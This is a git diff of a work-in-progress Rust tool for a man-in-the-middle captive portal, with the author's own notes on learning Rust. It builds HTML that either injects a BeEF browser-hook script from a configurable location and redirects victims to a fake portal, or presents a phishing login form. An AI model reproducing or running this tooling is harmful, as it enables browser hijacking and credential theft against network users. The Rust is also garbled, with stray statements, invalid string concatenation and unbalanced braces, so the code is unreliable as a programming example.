@@ -12,7 +12,8 @@ cargo install +nightly racer
 #!
   - and_then() is totally a thing, fucking awesome
 
-
+  - println!("{}{}", foo, bar);
+    - String concatention WHEN PRINTING TO TERMINAL
 
 
 
@@ -26,11 +27,10 @@ cargo install +nightly racer
 /*
   Load all external "modules"
 */
-mod captive_portal_option_parse;
+mod captive_portal_option_parser;
 // captive_portal_option_parse::parse_commandline_arguments();
-
+std::io::B
 extern crate clap;
-use std:io:B
 //Basic stuff
 use std::char;
 use std::thread;
@@ -100,7 +100,7 @@ let width_columns             = 0;
 // set by finding minimum size necessary for properly displaying the data
 // presented
 let mut init_display_height   = 0;
-let mut init_display_width    = 0;  
+let mut init_display_width    = 0;
 
 // Defaults for beefhook, captive portal, and ncurses switches
 let hook                      = true;
@@ -117,6 +117,21 @@ fn termcolorprint(text_color, text ) -> io::Result<()> {
     stdout.set_color(ColorSpec::new().set_fg(Some(Color::text_color)))?;
     writeln!(&mut stdout, text)
 };
+
+//why do I have to do this people?
+// This is a series of various string concatention functions
+fn concat_format_nl(text1 , text2){
+    format!("{}{}", text1 , text2)
+}
+fn concat_format(text1 , text2){
+    format("{}{}", text1 , text2)
+}
+fn concat_print_nl(text1 , text2){
+    println!("{}{}", text1 , text2)
+}
+fn concat_print(text1 , text2){
+    println("{}{}", text1 , text2)
+}
 
 // add conditional to use ncurses output
 fn shutdown_server(){
@@ -139,8 +154,8 @@ fn setup_listener(){
 
 // server handler
 fn handle_connection(mut stream: TcpStream) {
-    
-    /*Request listener*/ 
+
+    /*Request listener*/
     let mut buffer = [0; 512];
     stream.read(&mut buffer).unwrap();
     println!("Request: {}", String::from_utf8_lossy(&buffer[..]));
@@ -175,11 +190,18 @@ returns a string containing the html needed to make wither a redirect or form wi
  @return The html you need when the xenomorphs come calling
 
 */
-fn make_html( hook_loc,  redirect,  formaction, bool form_or_redirect) {
+std::i128
+fn make_html( hook_loc,  redirect,  formaction, form_or_redirect) {
+
     let html_redirect_body;
+
     let html_form_body;
-    let hook_location;
+
+    let hook_location = hook_loc;
+
     let redirect_ip = redirect;
+
+    // build the form
     let html_login_head ="<!DOCTYPE html><html><head><meta charset=\"utf-8\" /><title></title></head>";
     let html_form_body_top = "<body><form class=\"login\" ";
     let form_action = "action=\"" + formaction + "\" ";
@@ -190,14 +212,17 @@ fn make_html( hook_loc,  redirect,  formaction, bool form_or_redirect) {
         </form>\
         </body>\
         </html>";
+    // build the redirect
     let html_redirect_head = "<html><head>";
     let beef_hook = "<script src=" + hook_loc + "></script>";
     let html_redirect_middle = "<meta http-equiv=\"refresh\" content=\"0; url=http://" + redirect_ip + "\" />";
     let redirect_bottom = "</head><body><b>Redirecting to MITM hoasted captive portal page</b></body></html>";
-    if (form_or_redirect == true) {
-        html_redirect_body = html_redirect_head + beef_hook + html_redirect_middle + redirect_bottom;
+
+    // Determine if the user wants the form or the redirect
+    if form_or_redirect == true {
+        let html_redirect_body = std::concat!() html_redirect_head + beef_hook + html_redirect_middle + redirect_bottom;
         return html_redirect_body;
-    } else if (form_or_redirect == false ) {
+    else if (form_or_redirect == false{
         html_form_body = html_login_head + html_form_body_top + form_action + html_form_body_bottom;
         return html_form_body;
     };
